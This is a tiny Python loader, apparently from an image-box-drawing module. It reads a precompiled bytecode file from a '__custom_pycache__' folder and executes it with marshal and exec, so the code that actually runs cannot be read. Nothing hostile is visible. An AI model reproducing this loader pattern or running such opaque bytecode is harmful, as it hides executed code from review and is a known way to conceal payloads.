
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageDrawBoxes_9f7289538e9d40feb9e19e9d230373c3.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
